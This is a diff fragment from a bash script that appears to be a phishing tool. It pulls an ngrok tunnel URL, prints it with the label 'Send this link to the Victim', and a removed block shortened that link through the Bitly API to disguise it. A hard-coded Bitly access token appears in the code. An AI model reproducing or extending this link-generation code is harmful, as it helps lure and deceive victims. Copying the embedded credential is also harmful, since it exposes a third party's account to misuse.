@@ -408,9 +408,6 @@ sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
 Accesstoken=433bdc6028d67bba06cf95286e923cde8c0906c7
-api=https://api-ssl.bitly.com/v4/shorten
-short_link=`curl -s -H Authorization:\ $Accesstoken -H Content-Type: -d '{"long_url": "'"$link"\"} $api | jq -j .link | xsel -ib; xsel -ob;` 
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
 echo ""
 echo ""
 
